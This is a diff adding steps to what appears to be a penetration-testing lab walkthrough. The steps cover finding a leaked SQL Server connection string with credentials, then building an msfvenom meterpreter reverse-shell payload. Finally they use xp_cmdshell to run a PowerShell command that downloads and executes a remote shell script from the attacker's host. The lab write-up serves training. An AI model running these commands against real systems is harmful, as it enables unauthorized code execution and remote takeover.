@@ -101,7 +101,30 @@ Using Dirbuster we find a secret folder called **project**. This url is accessib
 
 ![](../../../../.gitbook/assets/image%20%281%29.png)
 
+![We find suspicious files under /project/backup/test](../../../../.gitbook/assets/image%20%283%29.png)
 
+![](../../../../.gitbook/assets/image%20%282%29.png)
+
+{% embed url="http://172.16.64.140/project/backup/test/sdadas.txt" %}
+
+```text
+Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
+/var/www/html/project/354253425234234/flag.txt
+```
+
+#### 172.16.64.199
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.64.11 -f ps1 > rv.ps1
+```
+
+```text
+python2 /usr/share/doc/python3-impacket/examples/mssqlclient.py fooadmin@172.16.64.199
+enable_xp_cmdshell
+RECONFIGURE
+xp_cmdshell whoami
+xp_cmdshell powershell IEX(New-Object Net.WebClient).DownloadString(\"http://172.16.64.10:8080/revshell.ps1\")
+```
 
 
 
